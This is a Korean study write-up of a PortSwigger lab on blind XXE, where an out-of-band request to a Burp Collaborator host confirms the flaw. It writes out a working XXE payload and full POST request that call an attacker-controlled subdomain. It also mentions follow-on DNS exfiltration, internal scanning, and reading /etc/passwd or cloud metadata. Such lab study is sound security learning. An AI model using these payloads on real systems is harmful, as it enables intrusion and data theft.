# Lab: Blind XXE with out-of-band interaction

## 개요

- **난이도**: Practitioner
- **주제**: Blind XXE — 응답에 내용 미반영 / Out-of-Band 외부 서버 요청으로 취약점 확인
- **링크**: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

## 목표

응답 본문에 엔티티 내용이 반영되지 않는 Blind XXE 환경에서, 외부 서버(Burp Collaborator)로 HTTP/DNS 요청을 유발해 취약점 존재를 확인한다. 데이터 탈취보다 **취약점 탐지** 자체가 목표인 랩이다.

## 001~002 랩과의 차이

```
[001 랩 — 파일 읽기, 응답 반영]
  SYSTEM "file:///etc/passwd"
  → 파일 내용이 에러 메시지에 반영
  → 즉시 파일 내용 확인 가능

[002 랩 — SSRF, 응답 반영]
  SYSTEM "http://169.254.169.254/..."
  → 메타데이터 응답이 에러 메시지에 반영
  → 응답에서 직접 확인 가능

[003 랩 (이번) — Blind XXE]
  SYSTEM "http://외부서버/"
  → 파서가 외부 요청을 보내지만
  → 응답 본문에는 아무것도 반영 안 됨
  → 외부 서버 로그에서 요청이 들어왔는지 확인
```

## Blind XXE 란

```
일반 XXE:
  엔티티 내용이 응답 본문에 포함
  → 공격자가 직접 읽기 가능

Blind XXE:
  XML 파서가 외부 엔티티를 처리
  → 하지만 처리 결과가 응답에 나타나지 않음

  이유:
    에러 메시지에 입력값 미반영
    정상 응답만 반환 (에러 숨김)
    비동기 처리 (응답과 파일 읽기가 분리)

  탐지 방법:
    Out-of-Band 채널 이용
    → 서버가 공격자 제어 외부 서버로 요청 발생
    → 응답에서 못 읽더라도 외부 서버 로그로 확인
```

## Out-of-Band (OOB) 인터랙션

```
대역 외(Out-of-Band) 채널:

[In-Band — 같은 채널]
  요청 → 서버 처리 → 같은 HTTP 응답으로 결과 반환
  001, 002 랩이 여기 해당

[Out-of-Band — 별도 채널]
  요청 → 서버 처리 → 서버가 별도 외부 서버로 요청 발생
  공격자는 외부 서버 로그에서 결과 확인
  메인 HTTP 응답에는 아무것도 없음

OOB 인터랙션 유형:
  DNS 조회:
    서버가 attacker.com 을 DNS 조회
    → attacker.com DNS 서버 로그에 기록

  HTTP 요청:
    서버가 http://attacker.com/ 으로 GET
    → attacker.com 웹서버 로그에 기록
```

## Burp Collaborator

```
Burp Suite 가 제공하는 OOB 탐지 도구

역할:
  공격자가 제어하는 외부 서버 역할
  DNS + HTTP + SMTP 인터랙션 캡처

동작:
  1. Burp Collaborator 서브도메인 생성:
     xxxx.oastify.com

  2. 페이로드에 해당 도메인 삽입:
     SYSTEM "http://xxxx.oastify.com/"

  3. 서버가 외부 엔티티 처리 시:
     → xxxx.oastify.com 으로 DNS/HTTP 요청 발생

  4. Burp Collaborator 탭에서 인터랙션 확인:
     DNS 조회 기록
     HTTP 요청 기록 (헤더, 타임스탬프)

Burp Suite 에서 접근:
  Burp → Collaborator → "Copy to clipboard"
  → 생성된 서브도메인을 페이로드에 삽입
  → "Poll now" 버튼으로 인터랙션 확인
```

## 공격 방법

### 페이로드

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 001~002 랩과의 차이점

```
변경된 것:
  URI: "file:///etc/passwd" → "http://외부서버/"
  외부 서버만 변경, 나머지 구조 동일

동일한 것:
  DOCTYPE 블록 삽입 방법
  ENTITY 선언 문법
  &xxe; 참조 위치
  Content-Type: application/xml

결과 확인 방법만 다름:
  001, 002: 응답 본문에서 직접 확인
  003:      Burp Collaborator 에서 OOB 인터랙션 확인
```

### 실행 흐름

```
1. Burp Collaborator 서브도메인 복사:
   xxxx.oastify.com

2. 페이로드 전송:
   POST /product/stock
   Content-Type: application/xml

   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxxx.oastify.com/">]>
   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

3. 서버 처리:
   XML 파서가 &xxe; 엔티티 해석
   → http://xxxx.oastify.com/ 으로 HTTP 요청 발생
   → DNS: xxxx.oastify.com 주소 조회

4. 서버 응답:
   정상 응답 또는 에러
   → 응답 본문에 파일 내용 없음 (Blind)

5. Burp Collaborator 확인:
   "Poll now" 클릭
   → DNS 조회 기록 확인
   → HTTP GET 기록 확인
   → 취약점 존재 확인!
```

## Blind XXE 의 의미

### 왜 탐지만 해도 의미 있는가

```
001 랩 (응답 반영) 이 불가능한 환경:

  WAS 가 에러 메시지에 입력값 미포함:
    "Invalid product ID"  ← 입력값 없음
    → 파일 내용이 응답에 나타나지 않음

  그래도 파서는 외부 엔티티 처리:
    → 파일 읽기 시도 (실패해도 요청 발생)
    → 외부 HTTP 요청 발생 (DNS 조회)
    → OOB 채널로 탐지 가능

탐지 후 활용:
  OOB 만 가능한 환경에서 데이터 탈취:
    파라미터 엔티티 + 외부 DTD 로딩 (004 랩)
    → DNS 서브도메인에 파일 내용을 인코딩해 전송
    → 응답 없이도 데이터 탈취 가능 (심화 기법)
```

### 탐지 가능 = 공격 가능

```
Blind XXE 로 탐지가 됐다면:
  ① 파서가 외부 엔티티를 처리함 (확인)
  ② 네트워크 아웃바운드가 가능함 (확인)

이후 단계:
  Out-of-Band 데이터 탈취
    → DNS 서브도메인에 파일 내용 인코딩
    → xxxx.oastify.com 로그에서 확인

  내부 네트워크 스캔
    → 다양한 내부 IP 로 SSRF 발생 여부 확인
    → 열린 포트, 서비스 파악
```

## 핵심 정리

- Blind XXE 는 응답 본문에 엔티티 내용이 반영되지 않는 환경에서의 XXE 로, OOB 채널(외부 서버 요청)로 취약점 존재를 확인한다.
- `SYSTEM "http://외부서버/"` 로 URI 만 변경하면 파일 읽기와 동일한 구조로 외부 HTTP/DNS 요청을 유발할 수 있다.
- 응답에 데이터가 없어도 외부 서버에 요청이 도달하면 취약점이 존재하는 것이고, 이를 발판으로 심화 기법(DNS 경유 데이터 탈취)으로 발전시킬 수 있다.
- 방어는 동일: XML 파서의 외부 엔티티 비활성화 + 네트워크 아웃바운드 제한.

## 배운 점 및 추가 학습

### 1. OOB 탐지가 필요한 이유

```
보안 진단 시 많은 취약점이 응답에 나타나지 않음:

  Blind SQL Injection  → 조건부 응답 지연으로 탐지
  Blind XSS           → 피해자 브라우저에서 외부 서버로 요청
  Blind SSRF          → 내부 서버가 외부로 요청
  Blind XXE (이번)    → 파서가 외부로 요청

OOB 가 없었다면:
  Blind 취약점 = 탐지 불가
  → 취약하지만 발견 못 하고 방치

OOB 도구:
  Burp Collaborator (유료 포함)
  interactsh (오픈소스 대안)
  canarytokens.org
  webhook.site (간단한 HTTP 수신)
  dnslog.cn (DNS 조회 확인)
```

### 2. DNS vs HTTP OOB 인터랙션

```
[DNS OOB]
  서버가 도메인 주소를 조회할 때 발생
  → HTTP 차단되어도 DNS 는 허용되는 경우 많음
  → 방화벽 우회 가능성 높음
  → 데이터를 서브도메인에 인코딩:
     data.xxxx.oastify.com → DNS 조회 → Collaborator 수신

[HTTP OOB]
  서버가 외부 URL 로 HTTP GET/POST 발생
  → 아웃바운드 HTTP 가 허용된 경우
  → 요청 본문/헤더에 데이터 포함 가능

우선순위:
  HTTP 아웃바운드 차단된 경우:
    DNS OOB 로 시도
  DNS 도 차단된 경우:
    완전한 네트워크 격리 → OOB 탐지 불가
```

### 3. 001~003 랩 XXE 패턴 종합 비교

| 항목 | 001 (파일 읽기) | 002 (SSRF) | 003 (Blind OOB) |
|------|----------------|------------|-----------------|
| URI | `file://` | `http://내부` | `http://외부` |
| 대상 | 로컬 파일 | 내부 메타데이터 | 외부 Collaborator |
| 응답 반영 | O (에러 메시지) | O (에러 메시지) | X (Blind) |
| 결과 확인 | 응답 본문 | 응답 본문 | Collaborator 로그 |
| 목적 | 데이터 탈취 | 내부 서비스 접근 | 취약점 존재 탐지 |
| 난이도 | Apprentice | Apprentice | Practitioner |
